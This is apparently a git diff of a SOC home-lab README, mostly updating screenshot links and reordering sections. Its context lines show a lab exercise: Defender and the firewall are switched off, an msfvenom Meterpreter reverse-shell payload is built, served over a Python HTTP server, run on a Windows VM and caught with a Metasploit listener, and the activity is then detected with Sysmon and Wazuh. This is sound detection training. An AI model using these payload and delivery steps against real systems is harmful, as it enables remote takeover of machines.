@@ -1,5 +1,6 @@
-# SOC Home Lab Documentation
-<img align="right" src="https://visitor-badge.laobi.icu/badge?page_id=smileycookie.SOC_Home_Lab" />
+<div align="center">
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/SOC_Home_Lab%20.png">
+</div>
 
 ## Contents
 1. [Introduction](#introduction)
@@ -87,7 +88,7 @@ The objective of this lab is to simulate real-world security scenarios, analyze 
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/1c022d91d5d97a01a09f850bc241acaf945e20c7/Screenshots/pic_1_Nat.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/1.png" >
     <p><em>Figure.1: NAT Network Configuration.</em></p>
 </div>
 
@@ -143,7 +144,7 @@ The objective of this lab is to simulate real-world security scenarios, analyze 
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/1c022d91d5d97a01a09f850bc241acaf945e20c7/Screenshots/pic_2_Taking_SS.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/2.png" >
     <p><em>Figure.2: Figure.: Taking Snapshot of VMs.</em></p>
 </div>
 
@@ -157,13 +158,13 @@ The objective of this lab is to simulate real-world security scenarios, analyze 
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/pic_3_Turnoff%20defeder.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/3.png" >
     <p><em>Figure.3: Turn off Real-time protection. </em></p>
 </div>
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/pic_4_%20Turn%20off%20Windows%20Defender%20Firewall.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/4.png" >
     <p><em>Figure.4: Turn off Windows Defender Firewall</em></p>
 </div>
 
@@ -201,7 +202,7 @@ sysmon -accepteula -i sysconfig-export.xml
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/pic_5_Installation%20of%20Sysmon.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/5.png" >
     <p><em>Figure.5: Installation of Sysmon.</em></p>
 </div>
 
@@ -214,7 +215,7 @@ sysmon -c
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/pic_6%20Verification%20of%20Sysmon%20installation.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/6.png" >
     <p><em>Figure.6: Verification of Sysmon installation</em></p>
 </div>
 
@@ -226,7 +227,7 @@ sysmon -c
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/Pic_7_%20Verification%20of%20Sysmon%20Running%20in%20Event%20Viewer.png" >
+    <img src="[https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/Pic_7_%20Verification%20of%20Sysmon%20Running%20in%20Event%20Viewer.png](https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/7.png)" >
     <p><em>Figure.7: Verification of Sysmon Running in Event Viewer</em></p>
 </div>
 
@@ -239,7 +240,7 @@ sudo bash wazuh-install.sh --quickstart
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/8_Installation%20of%20Wazuh%20Dashboard.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/8.png" >
     <p><em>Figure.8: Installation of Wazuh Dashboard</em></p>
 </div
 
@@ -263,7 +264,7 @@ sudo systemctl status kibana
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/9_Wazuh%20Agent%20configuration.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/9.png" >
     <p><em>Figure.9:Wazuh Agent configuration</em></p>
 </div
 
@@ -275,7 +276,7 @@ sudo systemctl status kibana
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/10_erating%20payload_.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/10.png" >
     <p><em>Figure.10:Generating payload</em></p>
 </div
 
@@ -305,7 +306,7 @@ msfvenom -p windowsx64/meterpreter/reverse_tcp LHOST=10.0.2.14 LPORT=4444 -f exe
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/11_Creating%20Python%20server%20in%20Terminal.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/11.png" >
     <p><em>Figure.11:Creating Python server in Terminal</em></p>
 </div
 
@@ -317,19 +318,13 @@ python3 -m http.server 8080
 ```
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/12_Downloading%20the%20shell.exe%20(Payload)%20form%20the%20Python%20server.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/12.png" >
     <p><em>Figure.12:Downloading the shell.exe (Payload) form the Python server</em></p>
 </div
 
 
 - Open a browser and enter the address: `10.0.2.14:8080`
 - Confirm that `shell.exe` is downloaded in the `C:\Users\Public\` folder.
-
-<div align="center">
-<!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/13_%20Setting%20up%20the%20Metasploit%20Listener.png" >
-    <p><em>Figure.13:Setting up the Metasploit Listener (listener is now waiting for a connection)</em></p>
-</div
 
 
 ## Step 8: Setting up a Metasploit Listener
@@ -343,11 +338,10 @@ set LHOST 10.0.2.14
 set LPORT 4444
 exploit
 ```
-
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/14_Creation%20of%20Reverse%20Bind%20Shell.png" >
-    <p><em>Figure.14:Creation of Reverse Bind Shell</em></p>
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/13.png" >
+    <p><em>Figure.13:Setting up the Metasploit Listener (listener is now waiting for a connection)</em></p>
 </div
 
 
@@ -360,17 +354,16 @@ C:\Users\Public\shell.exe
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/15_Confirmation%20of%20Execution%20of%20Payload%20(shell.exe).png" >
-    <p><em>Figure.15:Confirmation of Execution of Payload (shell.exe)</em></p>
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/14.png" >
+    <p><em>Figure.14:Creation of Reverse Bind Shell</em></p>
 </div>
 
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/16_Sysmon%20Log%20ingestion%20in%20Wazuh%20dashboard%20is%20working.png" >
-    <p><em>Figure.16: Sysmon Log ingestion in Wazuh dashboard is working.</em></p>
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/15.png" >
+    <p><em>Figure.15:Confirmation of Execution of Payload (shell.exe)</em></p>
 </div>
-
 
 ## Step 9: Log Verification in Wazuh
 - Open the **Wazuh Dashboard (Kibana)**.
@@ -379,6 +372,26 @@ C:\Users\Public\shell.exe
   data.win.system.providerName: "Microsoft-Windows-Sysmon"
   ```
 - Check if logs show process creation and network connections.
+
+<div align="center">
+<!--   <h1>My Project</h1> -->
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/16.png" >
+    <p><em>Figure.16: Sysmon Log ingestion in Wazuh dashboard is working.</em></p>
+</div>
+
+
+## Step 10: Attack Detection & Analysis
+### 1. Review Attack Logs in Wazuh Dashboard
+ - Open the Wazuh Dashboard in your browser.
+ - Navigate to **Security Events** or **Alerts**.
+ - Use the search/filter function to look for logs using the following table view with keys:
+
+  ```plaintext
+  agent.ip
+  rule.id
+  data.win.eventdata.LogonGuid
+  data.win.eventdata.Commandline
+  ```
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
@@ -392,46 +405,28 @@ C:\Users\Public\shell.exe
     <p><em>Figure.18:Telemetry Analysis 2.</em></p>
 </div>
 
-## Step 10: Attack Detection & Analysis
-### 1. Review Attack Logs in Wazuh Dashboard
- - Open the Wazuh Dashboard in your browser.
- - Navigate to **Security Events** or **Alerts**.
- - Use the search/filter function to look for logs using the following table view with keys:
-        ```
-        agent.ip
-        rule.id
-        data.win.eventdata.LogonGuid
-        data.win.eventdata.Commandline
-        ```
-    
+
+
+### 2. Identify Indicators of Compromise (IOCs)
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/19_%20Process%20Creation%20(Event%20ID%201).png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/19.png" >
     <p><em>Figure.19: Process Creation (Event ID 1).</em></p>
 </div>
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/20_File%20Drops%20(Event%20ID%2011).png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/20.png" >
     <p><em>Figure.20: File Drops (Event ID 11).</em></p>
 </div>
 
 <div align="center">
 <!--   <h1>My Project</h1> -->
-    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/21_%20Rule.description%3A%20Executable%20file%20drop.png" >
+    <img src="https://github.com/smileycookie/SOC_Home_Lab/blob/main/Screenshots/21.png" >
     <p><em>Figure.21:  Rule.description: Executable file dropped in folder commonly used by malware.</em></p>
 </div>
 
-### 2. Identify Indicators of Compromise (IOCs)
 
-    - **Figures:**
-      - **Process Creation (Event ID 1)** ![Process Creation](#)
-      - **File Drops (Event ID 11)** ![File Drops](#)
-      - **Rule.description: Executable file dropped in folder commonly used by malware** ![Rule Description](#)
-
-    ![Attack Analysis1](#)
-        ![Attack Analysis2](#)
-            ![Attack Analysis](#)
 ## Troubleshooting
 - Ensure all VMs are configured with the correct network settings to avoid connectivity issues.
 - Keep your system resources in check; allocate sufficient RAM and CPU to VMs for smooth performance.
@@ -457,4 +452,4 @@ C:\Users\Public\shell.exe
 - **Blog Guide**: Simply Cyber Blog : https://www.simplycyber.io/post/uncover-the-secrets-of-a-home-soc-analyst-lab-step-by-step-walkthrough
 
 I have attached the link to the log report for reference.
-Drive Link: (Comming Soon)
+Logs Link: https://github.com/smileycookie/SOC_Home_Lab/tree/main/Logs
